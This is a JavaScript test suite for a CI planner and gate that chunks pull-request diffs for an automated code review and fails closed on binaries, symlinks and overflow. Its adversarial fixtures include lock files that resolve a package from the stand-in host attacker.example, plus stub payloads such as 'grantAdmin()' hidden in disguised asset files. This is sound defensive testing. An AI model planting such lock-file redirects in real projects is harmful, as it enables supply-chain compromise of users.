import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { describe, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { runInNewContext } from 'node:vm';
import { aggregateReviews } from './review-gate.mjs';
import { buildPlan, classifyFile, manifestDigest, parseNumstat, renderPacket, renderPrompt } from './review-plan.mjs';

// Each fixture uses real objects and leaves the checkout at base during rendering.
function fixture(context, before, after) {
  const repoDir = mkdtempSync(join(tmpdir(), 'review-plan-'));
  context.after(() => rmSync(repoDir, { recursive: true, force: true }));
  const git = (...arguments_) => execFileSync('git', arguments_, { cwd: repoDir, encoding: 'utf8' });
  git('init', '-q');
  git('config', 'user.email', 'test@example.invalid');
  git('config', 'user.name', 'Review fixture');
  function writeFiles(files) {
    for (const [path, content] of Object.entries(files)) {
      const target = join(repoDir, path);
      if (content === null) {
        rmSync(target);
      } else {
        mkdirSync(dirname(target), { recursive: true });
        writeFileSync(target, content);
      }
    }
  }
  writeFiles(before);
  git('add', '.');
  git('commit', '-qm', 'base', '--allow-empty');
  const base = git('rev-parse', 'HEAD').trim();
  writeFiles(after);
  git('add', '.');
  git('commit', '-qm', 'head', '--allow-empty');
  const head = git('rev-parse', 'HEAD').trim();
  git('checkout', '-q', base);
  return { repoDir, base, head, git };
}

function items(plan) {
  return plan.chunks.flatMap((chunk) => chunk.items);
}

describe('trusted git-object planning', () => {
  test('defaults to a 100000-character budget and 60 chunks for larger PRs', async (context) => {
    const input = fixture(context, {}, { 'large.ts': 'const value = true;\n'.repeat(4000) });
    const plan = await buildPlan(input);
    assert.equal(plan.budget, 100_000);
    assert.equal(plan.maxChunks, 60);
    assert.equal(plan.chunks.length, 1);
    assert.equal(plan.overflow, false);
  });

  test('classifies paths and orders workflow, source, tests, scripts/config, docs/data', async (context) => {
    const input = fixture(context, { 'small.ts': 'remove\n', 'large.ts': 'remove\n'.repeat(200) }, {
      '.github/workflows/ci.yml': 'name: ci\n', 'src/main.ts': 'export const value = 1;\n',
      'src/main.test.ts': 'test();\n', 'scripts/check.py': 'print(1)\n',
      'config.yaml': 'value: 1\n', 'README.md': 'docs\n', 'data.json': '{}\n',
      'icon.svg': '<svg/>\n', 'package-lock.json': '{"packages":{}}\n',
      'binary.bin': Buffer.from([0, 1, 2]), 'photo.png': 'asset\n',
      'dist/app.js': 'generated\n', 'build/app.js': 'generated\n',
      'coverage/report.txt': 'generated\n', 'app.min.js': 'generated\n', 'app.js.map': '{}\n',
      'small.ts': null, 'large.ts': null,
    });
    const plan = await buildPlan(input);
    assert.equal(items(plan)[0].path, '.github/workflows/ci.yml');
    const priorities = items(plan).map((item) => item.priority);
    assert.deepEqual(priorities, [...priorities].sort((left, right) => left - right));
    assert.equal(classifyFile('src/main.ts').category, 'source');
    assert.equal(classifyFile('src/main.test.ts').category, 'tests');
    assert.equal(classifyFile('scripts/check.py').category, 'scripts/config');
    assert.equal(classifyFile('data.json').category, 'docs/data');
    assert.equal(classifyFile('icon.svg').category, 'source');
    assert.ok(items(plan).some((item) => item.path === 'small.ts' && item.kind === 'deletion'));
    assert.ok(items(plan).some((item) => item.path === 'package-lock.json' && item.kind === 'diff' && item.priority === 5));
    assert.deepEqual(plan.skipped, []);
    assert.equal(plan.overflow, true);
    assert.equal(plan.uncovered.find((file) => file.path === 'binary.bin').reason, 'unreviewable_binary');
    for (const path of ['photo.png', 'large.ts', 'dist/app.js', 'build/app.js', 'coverage/report.txt', 'app.min.js', 'app.js.map']) {
      assert.ok(items(plan).some((item) => item.path === path), `Missing review for ${path}`);
    }
    assert.equal(plan.files.find((file) => file.path === 'large.ts').size, 1400);
  });

  test('packs small diffs and splits huge hunks without dropping bytes, within budget', async (context) => {
    const input = fixture(context, {}, {
      'src/a.ts': 'export const a = 1;\n', 'src/b.ts': 'export const b = 1;\n',
      'src/huge.ts': Array.from({ length: 250 }, (_, index) => `export const value${index} = ${index};\n`).join(''),
    });
    const plan = await buildPlan({ ...input, budget: 700 });
    assert.equal(plan.overflow, false);
    assert.ok(plan.chunks.some((chunk) => chunk.items.length === 2));
    assert.ok(plan.chunks.every((chunk) => chunk.characters <= 700));
    const parts = items(plan).filter((item) => item.path === 'src/huge.ts');
    assert.ok(parts.length > 2);
    assert.equal(parts.map((item) => item.diff).join(''), input.git('diff', '--no-color', '--find-renames', `${input.base}...${input.head}`, '--', 'src/huge.ts'));
    assert.ok(parts.every((item) => /part \d+\/\d+, head lines \d+-\d+/.test(item.label)));
    assert.equal(parts.at(-1).headEnd, 250);
  });

  test('prefers hunk boundaries and records correct head ranges', async (context) => {
    const lines = Array.from({ length: 100 }, (_, index) => `const value${index} = ${index};\n`);
    const changed = [...lines];
    changed[5] = 'const changedFirst = true;\n';
    changed[90] = 'const changedLast = true;\n';
    const input = fixture(context, { 'app.ts': lines.join('') }, { 'app.ts': changed.join('') });
    const plan = await buildPlan({ ...input, budget: 400 });
    const parts = items(plan);
    assert.equal(parts.length, 2);
    assert.match(parts[1].diff, /^@@/);
    assert.equal(parts[1].headStart, 88);
    assert.equal(parts[1].headEnd, 94);
  });

  test('splits an oversized single line without losing text or inventing head lines', async (context) => {
    const input = fixture(context, {}, { 'app.ts': 'const text = "' + 'x'.repeat(2000) + '";' });
    const plan = await buildPlan({ ...input, budget: 300 });
    assert.ok(plan.chunks.every((chunk) => chunk.characters <= 300));
    assert.equal(items(plan).map((item) => item.diff).join(''),
      input.git('diff', '--no-color', '--find-renames', `${input.base}...${input.head}`));
    assert.equal(items(plan).at(-1).headEnd, 1);
  });

  test('is deterministic, validates SHA inputs and binds all manifest fields in its digest', async (context) => {
    const input = fixture(context, {}, { 'app.ts': 'hello\n' });
    const first = await buildPlan(input);
    const regenerated = await buildPlan(input);
    assert.deepEqual(first, regenerated);
    assert.equal(renderPrompt(first, first.chunks[0]), renderPrompt(regenerated, regenerated.chunks[0]));
    assert.equal(first.digest, manifestDigest(first));
    assert.match(first.digest, /^[a-f0-9]{64}$/);
    assert.notEqual(first.digest, manifestDigest({ ...first, skipped: [{ path: 'other' }] }));
    await assert.rejects(() => buildPlan({ ...input, head: '--help' }), /SHA/);
    await assert.rejects(() => buildPlan({ ...input, budget: 0 }), /budget/);
  });

  test('overflow explicitly lists uncovered parts instead of silently dropping code', async (context) => {
    const input = fixture(context, {}, { 'app.ts': 'const longValue = true;\n'.repeat(300) });
    const plan = await buildPlan({ ...input, budget: 500, maxChunks: 2 });
    assert.equal(plan.overflow, true);
    assert.equal(plan.chunks.length, 2);
    assert.ok(plan.uncovered.length > 0);
    assert.ok(plan.uncovered.every((item) => item.path === 'app.ts'));
    assert.equal([...items(plan), ...plan.uncovered].map((item) => item.diff).join(''),
      input.git('diff', '--no-color', '--find-renames', `${input.base}...${input.head}`));
  });

  test('handles renames and safe literal filenames from NUL-delimited numstat', async (context) => {
    const input = fixture(context, { 'old name.ts': 'unchanged\n'.repeat(20) }, {
      'old name.ts': null, 'new [name].ts': 'unchanged\n'.repeat(20), 'literal-[x].ts': 'text\n',
    });
    const plan = await buildPlan(input);
    const renamed = plan.files.find((file) => file.path === 'new [name].ts');
    assert.equal(renamed.oldPath, 'old name.ts');
    assert.ok(items(plan).some((item) => item.diff.includes('rename from old name.ts')));
  });
});

describe('nested untrusted HEAD packet', () => {
  test('embeds only its exact chunk diff and copies full PR head context beneath packet/head', async (context) => {
    const input = fixture(context, { 'app.ts': 'base value\n', 'AGENTS.md': 'base instructions\n' }, {
      'app.ts': 'head value\n', 'AGENTS.md': 'untrusted instructions\n',
      '.codex/config.toml': 'untrusted config\n', 'other.ts': 'other head context\n',
      'package-lock.json': '{"packages":{}}\n',
    });
    const plan = await buildPlan({ ...input, budget: 200 });
    const packetDir = join(input.repoDir, '.codex-review-input');
    const promptPath = renderPacket({ ...input, plan, chunkId: plan.chunks[0].id, expectedDigest: plan.digest, packetDir });
    assert.equal(readFileSync(join(packetDir, 'head/app.ts'), 'utf8'), 'head value\n');
    assert.equal(readFileSync(join(packetDir, 'head/AGENTS.md'), 'utf8'), 'untrusted instructions\n');
    assert.equal(readFileSync(join(packetDir, 'head/.codex/config.toml'), 'utf8'), 'untrusted config\n');
    assert.equal(readFileSync(join(packetDir, 'head/other.ts'), 'utf8'), 'other head context\n');
    assert.equal(readFileSync(join(input.repoDir, 'AGENTS.md'), 'utf8'), 'base instructions\n');
    assert.equal(existsSync(join(input.repoDir, '.codex')), false);
    assert.equal(readFileSync(join(packetDir, 'head/package-lock.json'), 'utf8'), '{"packages":{}}\n');
    const prompt = readFileSync(promptPath, 'utf8');
    for (const item of plan.chunks[0].items) {
      assert.ok(prompt.includes(item.diff));
    }
    assert.match(prompt, /NOT the candidate/);
    assert.match(prompt, /chunk_id/);
    assert.match(prompt, /UNTRUSTED/);
    assert.match(prompt, /other.ts/);
    assert.throws(() => renderPacket({ ...input, plan, chunkId: plan.chunks[0].id, expectedDigest: 'bad', packetDir }), /digest/i);
  });

  test('caps context copies but retains their complete diff and reports the omission', async (context) => {
    const input = fixture(context, {}, { 'large.ts': 'abc\n'.repeat(100) });
    const plan = await buildPlan({ ...input, maxCopyBytes: 100 });
    const packetDir = join(input.repoDir, '.codex-review-input');
    const promptPath = renderPacket({ ...input, plan, chunkId: plan.chunks[0].id, expectedDigest: plan.digest, packetDir });
    assert.equal(existsSync(join(packetDir, 'head/large.ts')), false);
    assert.match(readFileSync(promptPath, 'utf8'), /context-size-cap/);
    assert.ok(items(plan)[0].diff.includes('+abc'));
  });

  test('refuses an existing packet symlink instead of writing outside the packet', async (context) => {
    const input = fixture(context, {}, { 'app.ts': 'head\n' });
    const plan = await buildPlan(input);
    const packetDir = join(input.repoDir, '.codex-review-input');
    symlinkSync(input.repoDir, packetDir);
    assert.throws(() => renderPacket({ ...input, plan, chunkId: plan.chunks[0].id, expectedDigest: plan.digest, packetDir }));
  });
});


describe('planner and gate CLI integration', () => {
  test('overflow with a skipped matrix fails the gate and published status, listing uncovered files', async (context) => {
    const input = fixture(context, {}, {
      'first.ts': 'const first = true;\n'.repeat(30),
      'second.ts': 'const second = true;\n'.repeat(30),
    });
    const plan = await buildPlan({ ...input, budget: 300, maxChunks: 1 });
    assert.equal(plan.overflow, true);
    const reportsDir = join(input.repoDir, 'reports');
    mkdirSync(reportsDir);
    const summaryPath = join(input.repoDir, 'summary.txt');
    const gatePath = fileURLToPath(new URL('./review-gate.mjs', import.meta.url));
    const gate = spawnSync(process.execPath, [gatePath], {
      cwd: input.repoDir, encoding: 'utf8',
      env: { ...process.env, REVIEW_HEAD: input.head, REVIEW_BASE: input.base,
        REVIEW_CHUNK_BUDGET: '300', REVIEW_MAX_CHUNKS: '1', REVIEW_DIGEST: plan.digest,
        REVIEW_REPORTS: reportsDir, REVIEW_RESULT: 'skipped', PLAN_RESULT: 'success',
        GATE_PREPARATION_RESULT: 'success', GITHUB_STEP_SUMMARY: summaryPath },
    });
    assert.equal(gate.status, 1);
    const summary = readFileSync(summaryPath, 'utf8');
    assert.match(summary, /"complete": false/);
    assert.match(summary, /Plan overflow/);
    for (const path of new Set(plan.uncovered.map((item) => item.path))) {
      assert.ok(summary.includes(path), `Summary must name uncovered file ${path}`);
    }

    // Execute the actual workflow publisher with a local GitHub stub. No network.
    const workflow = readFileSync(new URL('../workflows/codex-review.yml', import.meta.url), 'utf8');
    const marker = '          script: |\n';
    const script = workflow.slice(workflow.lastIndexOf(marker) + marker.length)
      .split('\n').map((line) => line.slice(12)).join('\n');
    const original = { number: 9, head: { sha: input.head }, base: { sha: input.base } };
    const statuses = [];
    const failures = [];
    const validationOutcome = gate.status === 0 ? 'success' : 'failure';
    await runInNewContext(`(async () => { ${script} })()`, {
      process: { env: { VALIDATION_RESULT: validationOutcome } },
      context: { payload: { pull_request: original }, repo: { owner: 'owner', repo: 'repo' },
        serverUrl: 'https://github.example', runId: 1 },
      github: { rest: {
        pulls: { get: async () => ({ data: original }) },
        repos: { createCommitStatus: async (status) => {
          statuses.push(status);
        } },
      } },
      core: { setFailed: (message) => {
        failures.push(message);
      } },
    });
    assert.equal(statuses.length, 1);
    assert.equal(statuses[0].context, 'Independent Codex review');
    assert.equal(statuses[0].state, 'failure');
    assert.equal(statuses[0].sha, input.head);
    assert.equal(failures.length, 1);
  });

  test('regenerates an identical manifest across checkouts and validates downloaded artifacts', async (context) => {
    const input = fixture(context, {}, { 'app.ts': 'candidate value\n' });
    const plannerPath = fileURLToPath(new URL('./review-plan.mjs', import.meta.url));
    const gatePath = fileURLToPath(new URL('./review-gate.mjs', import.meta.url));
    const manifestPath = join(input.repoDir, 'manifest.json');
    const outputsPath = join(input.repoDir, 'outputs.txt');
    const environment = { ...process.env, REVIEW_MANIFEST: manifestPath, GITHUB_OUTPUT: outputsPath };
    execFileSync(process.execPath, [plannerPath, 'plan', input.base, input.head, input.repoDir], { env: environment });
    const plan = JSON.parse(readFileSync(manifestPath, 'utf8'));
    assert.match(readFileSync(outputsPath, 'utf8'), /chunks=\["chunk-001"\]/);
    input.git('checkout', '-q', input.head);
    assert.deepEqual(await buildPlan(input), plan);
    input.git('checkout', '-q', input.base);
    execFileSync(process.execPath, [plannerPath, 'render', input.base, input.head, input.repoDir, 'chunk-001', plan.digest], { env: environment });
    assert.ok(existsSync(join(input.repoDir, '.codex-review-input/prompt.txt')));

    const reportsDir = join(input.repoDir, 'reports');
    mkdirSync(reportsDir);
    writeFileSync(join(reportsDir, 'chunk-001.json'), JSON.stringify({
      reviewed_head: input.head, reviewed_base: input.base, chunk_id: 'chunk-001',
      complete: true, verdict: 'pass', summary: 'Checked.', findings: [], limitations: [],
    }));
    const gateEnvironment = { ...process.env, REVIEW_HEAD: input.head, REVIEW_BASE: input.base,
      REVIEW_DIGEST: plan.digest, REVIEW_REPORTS: reportsDir, REVIEW_RESULT: 'success', PLAN_RESULT: 'success',
      GATE_PREPARATION_RESULT: 'success', GITHUB_STEP_SUMMARY: join(input.repoDir, 'summary.txt') };
    const runGate = (changes = {}) => spawnSync(process.execPath, [gatePath], {
      cwd: input.repoDir, env: { ...gateEnvironment, ...changes }, encoding: 'utf8',
    });
    assert.equal(runGate().status, 0);
    assert.match(readFileSync(gateEnvironment.GITHUB_STEP_SUMMARY, 'utf8'), /&quot;|Inspected|Checked/);
    assert.equal(runGate({ REVIEW_DIGEST: 'wrong' }).status, 1);
    assert.equal(runGate({ GATE_PREPARATION_RESULT: 'failure' }).status, 1);
    assert.equal(runGate({ REVIEW_RESULT: 'failure' }).status, 1);
  });

  test('context symlinks are listed as text and never created in the head copies', async (context) => {
    const input = fixture(context, {}, { 'app.ts': 'candidate\n' });
    input.git('checkout', '-q', input.head);
    symlinkSync('../outside', join(input.repoDir, 'link'));
    input.git('add', 'link');
    input.git('commit', '-qm', 'symlink as data');
    input.head = input.git('rev-parse', 'HEAD').trim();
    input.git('checkout', '-q', input.base);
    const plan = await buildPlan(input);
    const packetDir = join(input.repoDir, '.codex-review-input');
    renderPacket({ ...input, plan, chunkId: plan.chunks[0].id, expectedDigest: plan.digest, packetDir });
    assert.equal(existsSync(join(packetDir, 'head/link')), false);
    assert.match(readFileSync(join(packetDir, 'links.txt'), 'utf8'), /"link" -> "..\/outside"/);
    assert.equal(existsSync(join(input.repoDir, 'link')), false);
  });

  test('even malformed or legacy JSON locks receive their full text diff', async (context) => {
    const input = fixture(context, {}, { 'npm-shrinkwrap.json': '{"lockfileVersion":1,not valid JSON}' });
    const plan = await buildPlan(input);
    assert.equal(items(plan)[0].kind, 'diff');
    assert.match(items(plan)[0].diff, /not valid JSON/);
    assert.equal(items(plan)[0].priority, 5);
  });
});


describe('adversarial review coverage', () => {
  function skipMatrix(plan) {
    return aggregateReviews({ plan, head: plan.head, base: plan.base,
      reports: [], planResult: 'success', reviewerResult: 'skipped' });
  }

  test('a NUL byte in JavaScript cannot turn a code-only PR into a passing binary-only PR', async (context) => {
    const input = fixture(context, {}, { 'authorize.js': 'grantAdmin();\0\n' });
    const plan = await buildPlan(input);
    assert.equal(plan.chunks.length, 0);
    assert.equal(plan.overflow, true);
    assert.deepEqual(plan.skipped, []);
    assert.equal(plan.uncovered[0].path, 'authorize.js');
    assert.equal(plan.uncovered[0].reason, 'unreviewable_binary');
    assert.equal(skipMatrix(plan).complete, false);
  });

  test('all non-allowlisted binaries and all .github binaries remain explicitly uncovered', async (context) => {
    const paths = ['app.js', 'app.ts', 'tool.py', 'tool.sh', 'data.json', 'ci.yml', 'icon.svg',
      'unknown', 'unknown.xyz', '.png', 'archive.zip', 'archive.tar', 'assets/model.bin', 'model.gltf',
      '.github/actions/image.png', '.github/asset.glb', '.github/workflows/ci.yml',
      'package-lock.json', 'npm-shrinkwrap.json', 'yarn.lock', 'pnpm-lock.yaml'];
    const files = Object.fromEntries(paths.map((path) => [path, 'binary\0data\n']));
    const input = fixture(context, {}, files);
    const plan = await buildPlan(input);
    assert.equal(plan.overflow, true);
    assert.equal(plan.skipped.length, 0);
    assert.deepEqual(plan.uncovered.map((file) => file.path).sort(), [...paths].sort());
    assert.ok(plan.uncovered.every((file) => file.reason === 'unreviewable_binary'));
    assert.equal(skipMatrix(plan).complete, false);
  });

  test('allowlisted filenames containing text are reviewed with full HEAD context', async (context) => {
    const files = { 'script.png': 'grantAdmin();\n', 'model.obj': 'execDangerousCommand();\n' };
    const input = fixture(context, {}, files);
    const plan = await buildPlan(input);
    assert.deepEqual(plan.skipped, []);
    assert.deepEqual(plan.uncovered, []);
    for (const [path, content] of Object.entries(files)) {
      assert.ok(items(plan).some((item) => item.path === path && item.diff.includes(content)));
    }
    const packetDir = join(input.repoDir, '.codex-review-input');
    renderPacket({ ...input, plan, chunkId: plan.chunks[0].id, expectedDigest: plan.digest, packetDir });
    assert.equal(readFileSync(join(packetDir, 'head/script.png'), 'utf8'), files['script.png']);
    assert.equal(skipMatrix(plan).complete, false);
  });

  test('renaming a binary source file to an asset extension cannot hide its deletion', async (context) => {
    const payload = 'grantAdmin();\0\n'.repeat(30);
    const input = fixture(context, { '.github/actions/check.js': payload }, {
      '.github/actions/check.js': null, 'asset.png': payload,
    });
    const plan = await buildPlan(input);
    assert.equal(plan.files[0].oldPath, '.github/actions/check.js');
    assert.equal(plan.overflow, true);
    assert.equal(plan.skipped.length, 0);
    assert.equal(plan.uncovered[0].reason, 'unreviewable_binary');
  });

  test('build directories, bundled scripts and map/coverage text all consume review budget', async (context) => {
    const paths = ['.github/actions/build/index.js', 'src/build/authorize.ts', 'runtime.min.js',
      'dist/authorize.js', 'coverage/check.js', 'runtime.js.map'];
    const content = 'grantAdmin();\n'.repeat(50);
    const input = fixture(context, {}, Object.fromEntries(paths.map((path) => [path, content])));
    const plan = await buildPlan({ ...input, budget: 400 });
    assert.equal(plan.overflow, false);
    assert.equal(plan.skipped.length, 0);
    assert.ok(plan.chunks.length > paths.length);
    for (const path of paths) {
      const reviewed = items(plan).filter((item) => item.path === path).map((item) => item.diff).join('');
      assert.equal(reviewed, input.git('diff', '--no-color', '--find-renames', `${input.base}...${input.head}`, '--', path));
    }
    assert.equal(items(plan)[0].path, '.github/actions/build/index.js');
    assert.equal((await buildPlan({ ...input, budget: 400, maxChunks: 1 })).overflow, true);
  });

  test('large deletions are split and fully reviewed, or fail closed at the chunk cap', async (context) => {
    const input = fixture(context, { 'authorize.ts': 'enforcePermissions();\n'.repeat(300) }, { 'authorize.ts': null });
    const plan = await buildPlan({ ...input, budget: 400 });
    assert.equal(plan.skipped.length, 0);
    assert.equal(plan.overflow, false);
    assert.ok(plan.chunks.length > 1);
    assert.ok(items(plan).every((item) => item.kind === 'deletion'));
    assert.equal(items(plan).map((item) => item.diff).join(''), input.git('diff', '--no-color', '--find-renames', `${input.base}...${input.head}`));
    const capped = await buildPlan({ ...input, budget: 400, maxChunks: 1 });
    assert.equal(capped.overflow, true);
    assert.ok(capped.uncovered.every((item) => item.path === 'authorize.ts'));
    assert.equal(skipMatrix(capped).complete, false);
  });

  test('all lock files retain their full malicious diff at lowest priority and in HEAD copies', async (context) => {
    const paths = ['package-lock.json', 'npm-shrinkwrap.json', 'yarn.lock', 'pnpm-lock.yaml', 'Cargo.lock', 'composer.lock', 'custom.lock.json'];
    const content = 'resolved: https://attacker.example/install.tgz\nintegrity: changed\n'.repeat(5);
    const files = Object.fromEntries(paths.map((path) => [path, content]));
    const input = fixture(context, {}, { ...files, 'README.md': 'context\n' });
    const plan = await buildPlan({ ...input, budget: 400 });
    assert.equal(Object.hasOwn(plan, 'lockSummaries'), false);
    assert.equal(items(plan)[0].path, 'README.md');
    for (const path of paths) {
      const parts = items(plan).filter((item) => item.path === path);
      assert.ok(parts.length > 1);
      assert.ok(parts.every((item) => item.kind === 'diff' && item.priority === 5));
      assert.equal(parts.map((item) => item.diff).join(''), input.git('diff', '--no-color', '--find-renames', `${input.base}...${input.head}`, '--', path));
    }
    const packetDir = join(input.repoDir, '.codex-review-input');
    renderPacket({ ...input, plan, chunkId: plan.chunks[0].id, expectedDigest: plan.digest, packetDir });
    assert.equal(readFileSync(join(packetDir, 'head/yarn.lock'), 'utf8'), content);
  });

});


// Minimal headers are sufficient for the requested signature checks, not a claim
// that these fixture bytes form decodable media. NUL ensures git reports binary.
const assetHeaders = {
  png: Buffer.from('89504e470d0a1a0a', 'hex'), jpg: Buffer.from('ffd8ff', 'hex'),
  jpeg: Buffer.from('ffd8ff', 'hex'), gif: Buffer.from('GIF89a'),
  webp: Buffer.from('RIFF0000WEBP'), ico: Buffer.from('00000100', 'hex'), bmp: Buffer.from('BM'),
  avif: Buffer.from('0000ftyp'), mp4: Buffer.from('0000ftyp'), m4a: Buffer.from('0000ftyp'), mov: Buffer.from('0000ftyp'),
  mp3: Buffer.from('ID3'), wav: Buffer.from('RIFF0000WAVE'), ogg: Buffer.from('OggS'), flac: Buffer.from('fLaC'),
  webm: Buffer.from('1a45dfa3', 'hex'), woff: Buffer.from('wOFF'), woff2: Buffer.from('wOF2'),
  ttf: Buffer.from('00010000', 'hex'), otf: Buffer.from('OTTO'), glb: Buffer.from('glTF'),
  fbx: Buffer.from('Kaydara FBX Binary'), blend: Buffer.from('BLENDER'),
  ktx2: Buffer.from('ab4b5458203230bb', 'hex'), hdr: Buffer.from('#?RADIANCE'), exr: Buffer.from('762f3101', 'hex'),
};
const pngBytes = Buffer.concat([assetHeaders.png, Buffer.alloc(24)]);

// Alter git modes directly so fixtures behave identically on macOS and Linux.
function amendHead(input, mutate) {
  input.git('checkout', '-q', input.head);
  mutate();
  input.git('commit', '-qm', 'adversarial tree entry');
  input.head = input.git('rev-parse', 'HEAD').trim();
  input.git('checkout', '-q', input.base);
}

describe('asset signature and mode enforcement', () => {
  test('skips only ordinary 100644 asset blobs with extension-specific signatures', async (context) => {
    const files = Object.fromEntries(Object.entries(assetHeaders).map(([extension, header]) =>
      [`asset.${extension}`, Buffer.concat([header, Buffer.alloc(32)])]));
    const input = fixture(context, {}, files);
    const plan = await buildPlan(input);
    assert.equal(plan.overflow, false);
    assert.equal(plan.skipped.length, Object.keys(files).length);
    assert.equal(plan.chunks.length, 0);
    assert.ok(plan.skipped.every((file) => file.headMode === '100644' && file.headPrefixHex));
    const result = aggregateReviews({ plan, head: input.head, base: input.base,
      reports: [], planResult: 'success', reviewerResult: 'skipped' });
    assert.equal(result.complete, true);
  });

  test('bad magic, truncated headers, cross-format signatures and unchecked extensions fail closed', async (context) => {
    const files = {
      'shell.png': '#!/bin/sh\nrun_malicious_code\n\0',
      'wrong.png': Buffer.concat([assetHeaders.gif, Buffer.alloc(20)]),
      'short.png': Buffer.from('89504e4700', 'hex'),
      'wrong.webp': Buffer.from('RIFF0000WAVE\0'),
      'wrong.wav': Buffer.from('RIFF0000WEBP\0'),
      'wrong.mp4': Buffer.from('ftyp00000000\0'),
      'font.eot': Buffer.alloc(32), 'model.obj': Buffer.alloc(32),
      'model.dae': Buffer.alloc(32), 'model.gltf-bin': Buffer.alloc(32),
      '.github/valid.png': pngBytes,
    };
    const input = fixture(context, {}, files);
    const plan = await buildPlan(input);
    assert.equal(plan.skipped.length, 0);
    assert.equal(plan.overflow, true);
    assert.deepEqual(plan.uncovered.map((file) => file.path).sort(), Object.keys(files).sort());
    assert.ok(plan.uncovered.every((file) => file.reason === 'unreviewable_binary'));
  });

  test('an executable-mode PNG cannot pass even with a valid PNG header', async (context) => {
    const input = fixture(context, {}, { 'executable.png': pngBytes });
    amendHead(input, () => {
      chmodSync(join(input.repoDir, 'executable.png'), 0o755);
      input.git('update-index', '--chmod=+x', 'executable.png');
    });
    const plan = await buildPlan(input);
    assert.equal(plan.skipped.length, 0);
    assert.equal(plan.overflow, true);
    assert.equal(plan.uncovered[0].reason, 'unreviewable_binary');
    assert.equal(plan.uncovered[0].headMode, '100755');
  });

  test('asset symlinks and submodules cannot qualify as ordinary asset blobs', async (context) => {
    const input = fixture(context, {}, { 'file.ts': 'text\n' });
    amendHead(input, () => {
      symlinkSync('file.ts', join(input.repoDir, 'link.png'));
      input.git('add', 'link.png');
      input.git('update-index', '--add', '--cacheinfo', `160000,${input.base},module.png`);
    });
    const plan = await buildPlan(input);
    assert.equal(plan.skipped.length, 0);
    assert.equal(plan.overflow, true);
    assert.deepEqual(plan.uncovered.map((file) => file.path), ['link.png', 'module.png']);
    assert.ok(plan.uncovered.every((file) => file.reason === 'unreviewable_binary'));
  });

  test('a deleted binary asset has no HEAD mode/signature and cannot be silently skipped', async (context) => {
    const input = fixture(context, { 'deleted.png': pngBytes }, { 'deleted.png': null });
    const plan = await buildPlan(input);
    assert.equal(plan.skipped.length, 0);
    assert.equal(plan.overflow, true);
    assert.equal(plan.uncovered[0].reason, 'unreviewable_binary');
  });

  test('supports every alternate signature and reads a bounded prefix from large git blobs', async (context) => {
    const { matchesAssetSignature, readBlobPrefix } = await import('./review-plan.mjs');
    for (const [path, header] of [
      ['a.gif', Buffer.from('GIF87a')], ['a.ttf', Buffer.from('true')],
      ['a.hdr', Buffer.from('#?RGBE')], ['a.mp3', Buffer.from('fffb', 'hex')],
      ['a.mp3', Buffer.from('fff3', 'hex')], ['a.mp3', Buffer.from('fff2', 'hex')],
    ]) {
      assert.equal(matchesAssetSignature(path, header), true);
      assert.equal(matchesAssetSignature(path, header.subarray(1)), false);
    }
    const input = fixture(context, {}, { 'large.png': Buffer.concat([pngBytes, Buffer.alloc(4 * 1024 * 1024)]) });
    const object = input.git('rev-parse', `${input.head}:large.png`).trim();
    const prefix = await readBlobPrefix(input.repoDir, { type: 'blob', object, size: 4 * 1024 * 1024 + pngBytes.length });
    assert.equal(prefix.length, 32);
    assert.deepEqual(prefix, pngBytes);
    assert.equal((await buildPlan(input)).skipped[0].path, 'large.png');
  });
});

describe('entire HEAD context packet', () => {
  test('includes unchanged callers and executable text as read-only data from git objects', async (context) => {
    const input = fixture(context, { 'caller.ts': 'import { value } from "./api";\n', 'api.ts': 'old\n',
      'run.sh': '#!/bin/sh\necho safe\n' }, { 'api.ts': 'new\n' });
    amendHead(input, () => {
      chmodSync(join(input.repoDir, 'run.sh'), 0o755);
      input.git('update-index', '--chmod=+x', 'run.sh');
    });
    writeFileSync(join(input.repoDir, 'caller.ts'), 'base working-tree distraction\n');
    const plan = await buildPlan(input);
    assert.equal(plan.maxTotalCopyBytes, 100 * 1024 * 1024);
    const packetDir = join(input.repoDir, '.codex-review-input');
    const promptPath = renderPacket({ ...input, plan, chunkId: plan.chunks[0].id, expectedDigest: plan.digest, packetDir });
    assert.equal(readFileSync(join(packetDir, 'head/caller.ts'), 'utf8'), 'import { value } from "./api";\n');
    assert.equal(readFileSync(join(packetDir, 'head/run.sh'), 'utf8'), '#!/bin/sh\necho safe\n');
    assert.equal(lstatSync(join(packetDir, 'head/run.sh')).mode & 0o777, 0o444);
    const prompt = readFileSync(promptPath, 'utf8');
    assert.match(prompt, /Inspect relevant callers and dependencies/);
    assert.match(prompt, /context needed to judge a change is unavailable, return complete=false/);
    assert.ok(!prompt.includes('lock summar'));
    assert.equal(Object.hasOwn(plan, 'lockSummaries'), false);
  });

  test('lists symlink targets, submodules, assets, binaries and oversized unchanged context without copying them', async (context) => {
    const input = fixture(context, { 'api.ts': 'old\n', 'image.png': pngBytes,
      'huge.ts': 'text\n'.repeat(30), 'opaque.bin': Buffer.from([0, 1, 2]) }, { 'api.ts': 'new\n' });
    amendHead(input, () => {
      symlinkSync('../../outside', join(input.repoDir, 'caller-link'));
      input.git('add', 'caller-link');
      input.git('update-index', '--add', '--cacheinfo', `160000,${input.base},vendor`);
    });
    const plan = await buildPlan({ ...input, maxCopyBytes: 100 });
    const contextByPath = Object.fromEntries(plan.context.map((entry) => [entry.path, entry]));
    assert.equal(contextByPath['caller-link'].reason, 'symlink');
    assert.equal(contextByPath['caller-link'].target, '../../outside');
    assert.equal(contextByPath.vendor.reason, 'submodule');
    assert.equal(contextByPath['huge.ts'].reason, 'context-size-cap');
    assert.equal(contextByPath['image.png'].reason, 'asset_binary');
    assert.equal(contextByPath['opaque.bin'].reason, 'context-binary');
    const packetDir = join(input.repoDir, '.codex-review-input');
    const promptPath = renderPacket({ ...input, plan, chunkId: plan.chunks[0].id, expectedDigest: plan.digest, packetDir });
    for (const path of ['caller-link', 'vendor', 'huge.ts', 'image.png', 'opaque.bin']) {
      assert.equal(existsSync(join(packetDir, 'head', path)), false);
      assert.ok(readFileSync(promptPath, 'utf8').includes(path));
    }
    assert.match(readFileSync(join(packetDir, 'links.txt'), 'utf8'), /"caller-link" -> "..\/..\/outside"/);
  });

  test('enforces the total copy cap deterministically and lists unchanged files that do not fit', async (context) => {
